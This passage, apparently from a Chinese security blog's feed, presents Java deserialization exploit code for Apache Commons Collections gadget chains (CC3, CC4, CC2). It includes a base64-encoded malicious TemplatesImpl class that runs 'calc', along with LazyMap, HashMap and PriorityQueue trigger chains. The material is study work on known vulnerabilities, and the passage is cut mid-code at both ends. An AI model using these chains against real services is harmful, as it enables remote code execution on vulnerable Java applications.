class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//构造恶意类并转换为字节码</span></span><br><span class="line">         <span class="type">byte</span>[] bytes=Base64.decode(<span class="string">&quot;yv66vgAAADQAMAoACwAcCgAdAB4IAB8KAB0AIAcAIQoABQAiBwAjBwAkCgAIACUHACYHACcBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQANU3RhY2tNYXBUYWJsZQcAJgcAIQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACgBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4HACMBAApTb3VyY2VGaWxlAQAWVGVzdFRlbXBsYXRlc0ltcGwuamF2YQwADAANBwApDAAqACsBAARjYWxjDAAsAC0BABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAuAA0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAwALwEAFUNDMi9UZXN0VGVtcGxhdGVzSW1wbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlAQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACgALAAAAAAAEAAEADAANAAEADgAAAGAAAgACAAAAFiq3AAG4AAISA7YABFenAAhMK7YABrEAAQAEAA0AEAAFAAIADwAAABoABgAAAA8ABAARAA0AFAAQABIAEQATABUAFQAQAAAAEAAC/wAQAAEHABEAAQcAEgQAAQATABQAAgAOAAAAGQAAAAMAAAABsQAAAAEADwAAAAYAAQAAACIAFQAAAAQAAQAWAAEAEwAXAAIADgAAABkAAAAEAAAAAbEAAAABAA8AAAAGAAEAAAAmABUAAAAEAAEAFgAIABgADQABAA4AAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAIWSq3AAm/sQABAAAACQAMAAcAAgAPAAAAFgAFAAAAGAAJABsADAAZAA0AGgAWAB4AEAAAAAcAAkwHABkJAAEAGgAAAAIAGw==&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="comment">//构造利用链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line"></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//触发利用链</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map , chain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler)constructor.newInstance(java.lang.annotation.Target.class, lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMapProxy</span> <span class="operator">=</span> (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),lazyMap.getClass().getInterfaces(),invocationHandler);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(Target.class, lazyMapProxy);</span><br><span class="line">        <span class="comment">// 序列化与反序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(instance);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject</span><br><span class="line"> <span class="title function_">Map</span><span class="params">(Proxy)</span>.entrySet()</span><br><span class="line">    AnnotationInvocationHandler.invoke()</span><br><span class="line">     lazyMap.get()</span><br><span class="line">           ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line"> InstantiateTransformer.tranform()</span><br><span class="line"> </span><br><span class="line">TestTemplatesImpl-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTransletClasses()+newInstance()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="基于hashMap"><a href="#基于hashMap" class="headerlink" title="基于hashMap"></a>基于hashMap</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> CC5.shell;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用 CC6 链的前半部分链子</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3FinalEXP2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//byte[] evil = Files.readAllBytes(Paths.get(&quot;D:\\code\\javaweb\\cc1\\src\\main\\java\\CC3\\TemplatesImpl.class&quot;));</span></span><br><span class="line">        </span><br><span class="line">        <span class="type">byte</span>[] evil = shell.getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="comment">// 构造 setValue 的可控参数</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;five&quot;</span>)); <span class="comment">// 防止在反序列化前弹计算器</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;key&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在 put 之后通过反射修改值</span></span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cc;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//构造核心利用代码</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.decode(<span class="string">&quot;恶意类&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="comment">//构造利用链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain);</span><br><span class="line">        <span class="comment">//触发利用链</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field2.set(queue, comparator);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field3</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        field3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field3.set(queue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl, templatesImpl&#125;);</span><br><span class="line">        <span class="comment">//序列化  --&gt;  反序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;CC3链是基于前面的CC2链和CC1链改造而来的&lt;/p&gt;
&lt;h2 id=&quot;复习一下&quot;&gt;&lt;a href=&quot;#复习一下&quot; class=&quot;headerlink&quot; title=&quot;复习一下&quot;&gt;&lt;/a&gt;复习一下&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;ConstantTransfo</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CC2</title>
    <link href="http://example.com/2023/04/05/CC2/"/>
    <id>http://example.com/2023/04/05/CC2/</id>
    <published>2023-04-05T14:41:25.000Z</published>
    <updated>2023-04-09T08:30:14.328Z</updated>
    
    <content type="html"><![CDATA[<p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cc;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//构造恶意类TestTemplatesImpl并转换为字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;com.cc.TestTemplatesImpl&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//反射创建TemplatesImpl</span></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">TemplatesImpl_instance</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line">        <span class="comment">//将恶意类的字节码设置给_bytecodes属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(TemplatesImpl_instance , <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="comment">//设置属性_name为恶意类名</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(TemplatesImpl_instance , <span class="string">&quot;TestTemplatesImpl&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//构造利用链</span></span><br><span class="line">        InvokerTransformer transformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformer_comparator</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title 